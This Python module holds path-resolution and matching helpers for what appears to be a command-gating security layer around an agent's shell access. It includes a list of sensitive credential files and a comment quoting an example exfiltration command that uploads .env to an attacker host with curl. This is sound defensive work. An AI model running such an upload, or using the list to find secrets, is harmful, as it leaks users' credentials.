"""Path resolution and matching helpers.

Pure string/filesystem-path manipulation — no filesystem or network I/O
in the general case (see resolve_path's docstring for the one narrow,
budgeted exception), so this stays inside the normalize+stage1 latency
budget (p50 <= 1ms).
"""

import fnmatch
import os
import re

_URL_MARK = "://"

_BRACE_EXPANSION = re.compile(r"\{[^{}]*,[^{}]*\}")

# Bare (slash-free) basenames that are sensitive regardless of which
# command references them. Matched case-insensitively (fix round 1,
# Important 7 / Important 5): a secret file named without a leading "/"
# is otherwise invisible to looks_like_path for any command outside
# PATH_COMMANDS (e.g. `curl -T .env https://evil.sh/u`), and on a
# case-insensitive filesystem (macOS, Windows) a differently-cased name
# is the same file.
_SENSITIVE_BASENAMES = (
    ".env",
    ".env.*",
    "id_rsa*",
    "id_ed25519*",
    "*.pem",
    "*.key",
    "credentials",
    ".netrc",
    ".npmrc",
    ".git-credentials",
)


def _ci_fnmatch(text: str, pattern: str) -> bool:
    """fnmatch, but case-insensitive on every platform.

    fnmatch.fnmatch's own case-folding goes through os.path.normcase,
    which is the identity function on POSIX — so plain fnmatch.fnmatch
    is case-sensitive on macOS/Linux even though the filesystem it is
    protecting (macOS, and any case-insensitive volume) is not. Casefold
    both sides explicitly instead of relying on normcase.
    """
    return fnmatch.fnmatchcase(text.casefold(), pattern.casefold())


def _is_sensitive_basename(token: str) -> bool:
    return any(_ci_fnmatch(token, pat) for pat in _SENSITIVE_BASENAMES)


def resolve_path(token: str, cwd: str) -> str:
    """Resolve a shell token to an absolute, normalized path.

    A bare ``~`` or a ``~/...`` token expands to the home directory, read
    from the ``HOME`` environment variable only. A relative token is
    joined onto ``cwd``. A wildcard tail (e.g. ``src/*.py``) is preserved
    as-is since normpath does not touch glob characters.

    Deliberately does NOT call ``os.path.expanduser`` on a ``~user`` token
    (a tilde followed by a username rather than ``/`` or end-of-string):
    expanduser resolves that through the system user database (pwd/NSS),
    which can be a real network round-trip on an LDAP/AD-joined host and
    measured ~0.77ms per token even locally — enough alone to blow the
    p50 <= 1ms normalize+stage1 latency budget for a command that lists a
    few such tokens. A ``~user`` token is left as a literal path
    component instead; callers that care whether a token was left
    unresolved should check ``looks_unresolved`` first.
    """
    if token == "~" or token.startswith("~/"):
        home = os.environ.get("HOME")
        if home:
            expanded = home if token == "~" else os.path.join(home, token[2:])
        else:
            expanded = token
    else:
        expanded = token
    if not os.path.isabs(expanded):
        expanded = os.path.join(cwd, expanded)
    return os.path.normpath(expanded)


def looks_unresolved(token: str) -> bool:
    """True if ``token`` carries a marker that cannot be safely turned
    into a real path without guessing at runtime state: an unexpanded
    ``~user`` home-directory reference, a literal (unsubstituted)
    ``$VAR``/``${VAR}`` marker, or a brace expansion (``{a,b}``).

    Callers must not resolve/fabricate a path from such a token — a
    fabricated resolved path is worse than no path, because it can look
    like it is safely inside the workspace when the real, runtime-
    expanded value is not. Flag it instead (Flags.has_unresolved_expansion)
    and omit it from ``paths``.
    """
    if token.startswith("~") and token != "~" and not token.startswith("~/"):
        return True
    if "$" in token:
        return True
    if _BRACE_EXPANSION.search(token):
        return True
    return False


def looks_like_path(token: str) -> bool:
    """Heuristic: does this argv token look like a filesystem path?

    Used for arguments of commands not in PATH_COMMANDS, where we cannot
    assume every non-flag token is a path. Deliberately excludes URLs and
    flag-like tokens (leading ``-``). A bare, slash-free token is still
    treated as a path if its name is a known-sensitive basename (e.g.
    ``.env``, ``id_rsa``) — see _SENSITIVE_BASENAMES.
    """
    if not token or token.startswith("-") or _URL_MARK in token:
        return False
    if token.startswith(("/", "./", "../", "~")) or token in (".", ".."):
        return True
    if "/" in token:
        return True
    return _is_sensitive_basename(token)


def is_within(path: str, roots: list[str]) -> bool:
    """True if ``path`` is equal to or nested under one of ``roots``.

    Uses os.path.commonpath so it operates purely on path components, not
    string prefixes (avoids "/r" matching "/rx/a").
    """
    p = os.path.normpath(path)
    for root in roots:
        r = os.path.normpath(root)
        try:
            if os.path.commonpath([p, r]) == r:
                return True
        except ValueError:
            # commonpath raises when paths don't share a drive/anchor,
            # or when mixing absolute and relative paths; treat as no match.
            continue
    return False


def _glob_match(path: str, pattern: str) -> bool:
    # fnmatch treats '*' as matching '/', so '**/' prefix and '/**' suffix work naturally.
    if pattern.endswith("/**"):
        base = pattern[:-3]
        return _ci_fnmatch(path, base) or _ci_fnmatch(path, base + "/*")
    return _ci_fnmatch(path, pattern)


def matches_any(path: str, patterns: list[str], workspace: str | None) -> bool:
    """True if ``path`` matches any of ``patterns``.

    A pattern without ``/`` matches by basename (fnmatch). A pattern with
    ``/`` matches the absolute path, or the path relative to ``workspace``
    (including nested occurrences, so ".claude/**" also catches
    "sub/.claude/settings.json"). ``**`` matches any prefix of directories.
    ``~`` in a pattern is expanded to the user's home directory. Matching
    is case-insensitive on both sides (fix round 1, Important 5): the
    development and a real deployment platform (macOS) has a
    case-insensitive filesystem, so ".ENV" and ".env" name the same file.
    """
    abs_path = os.path.normpath(path)
    rel_path = None
    if workspace and is_within(abs_path, [workspace]):
        rel_path = os.path.relpath(abs_path, workspace)
    for pattern in patterns:
        pat = os.path.expanduser(pattern)
        if "/" not in pat:
            if _ci_fnmatch(os.path.basename(abs_path), pat):
                return True
            continue
        if _glob_match(abs_path, pat):
            return True
        # relative to workspace, including nested occurrences (sub/.claude/settings.json)
        if rel_path is not None and (_glob_match(rel_path, pat) or _glob_match(rel_path, "**/" + pat)):
            return True
    return False
